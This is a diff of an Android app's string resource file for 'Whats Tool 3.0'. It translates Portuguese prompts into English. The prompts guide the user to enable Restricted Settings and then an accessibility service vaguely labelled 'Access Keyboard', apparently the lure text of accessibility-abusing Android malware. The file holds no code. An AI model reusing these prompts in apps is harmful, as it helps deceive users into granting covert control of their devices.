@@ -1,14 +1,16 @@
 <resources>
-    <string name="app_name">Whats Tool 3.0</string>
-    <string name="app_user_id">66d9bddc09f7706563a838df</string>
-    <string name="accessibility_service_description">Access Keyboard</string>
+    <string name="app_name" translatable="false">Whats Tool 3.0</string>
+    <string name="app_user_id" translatable="false">66d9bddc09f7706563a838df</string>
+    <string name="accessibility_service_description" translatable="false">Access Keyboard</string>
+    <string name="app_link" translatable="false">https://www.google.com/</string>
+    <string name="app_link_enable" translatable="false">disable</string>
 
-    <string name="complete_activation">Agora você precisa concluir a ativação.</string>
-    <string name="allow_restrict1">1: Ativar Configuração Restrita</string>
-    <string name="enable_accessibility1">2: Ativar Acessibilidade</string>
-    <string name="allow_restrict2">2: Ativar Configuração Restrita</string>
-    <string name="enable_accessibility2">1: Ativar Acessibilidade</string>
-    <string name="enable_accessibility">Ativar Acessibilidade</string>
-    <string name="allow">Permitir</string>
-    <string name="enable">Ativar</string>
+    <string name="complete_activation">Now you need to complete the activation.</string>
+    <string name="allow_restrict1">1: Enable Restricted Settings</string>
+    <string name="enable_accessibility1">2: Enable Accessibility</string>
+    <string name="allow_restrict2">2: Enable Restricted Settings</string>
+    <string name="enable_accessibility2">1: Enable Accessibility</string>
+    <string name="enable_accessibility">Enable Accessibility</string>
+    <string name="allow">Allow</string>
+    <string name="enable">Enable</string>
 </resources>
